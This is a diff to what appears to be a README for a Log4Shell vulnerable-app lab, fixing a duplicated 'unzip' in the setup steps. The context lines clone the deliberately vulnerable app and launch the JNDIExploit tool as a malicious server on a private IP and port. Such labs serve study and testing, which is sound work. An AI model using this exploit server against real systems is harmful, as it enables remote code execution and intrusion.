@@ -40,7 +40,7 @@ We use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2
 ```bash
 git clone https://github.com/romanutti/log4shell-vulnerable-app.git
 cd log4shell-vulnerable-app/src/main/resources
-unzip unzip JNDIExploit.v1.2.zip
+unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
 
